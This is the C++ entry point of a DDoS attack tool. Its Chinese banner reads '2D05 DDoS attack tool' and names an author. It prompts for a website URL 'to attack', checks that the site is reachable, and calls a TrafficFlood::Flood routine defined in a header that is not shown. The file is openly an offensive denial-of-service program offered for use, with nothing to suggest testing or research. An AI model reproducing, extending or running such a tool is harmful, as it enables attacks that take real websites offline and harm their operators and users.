#include <iomanip>
#include <iostream>
#include <string>

#include "src/Controller/TrafficFlood.h"

using namespace std;

void Attack(std::string url);
void printBanner();

int main(int argc, char **argv) {
    std::string url;

#ifdef _WIN32
    system("cls");
#else
    system("clear");
#endif
    printBanner();

    cout << "\033[36m┌──────────────────────────────────────┐\033[0m\n";
    cout << "\033[36m│\033[0m     \033[1m请输入要攻击的网址:\033[0m            "
            "  "
            "\033[36m│\033[0m\n";
    cout << "\033[36m└──────────────────────────────────────┘\033[0m\n";
    cout << "\033[32m➜ \033[0m";
    cin >> url;

    Attack(url);

    return 0x0;
}

void Attack(std::string url) {
    TrafficFlood trafficFlood;

    if (trafficFlood.IsURLExist(url)) {
        trafficFlood.Flood(url);
    } else {
        std::cout << "\033[31m|> URL不可访问\033[0m" << std::endl;
        return;
    }
}

void printBanner() {
    cout << "\033[1;35m";
    cout << "╔════════════════════════════════════════════╗\n";
    cout << "║            2D05 DDoS 攻击工具              ║\n";
    cout << "║             版本: v1.0.0                   ║\n";
    cout << "║             作者: 钟智强                   ║\n";
    cout << "╚════════════════════════════════════════════╝\n";
    cout << "\033[0m\n";
}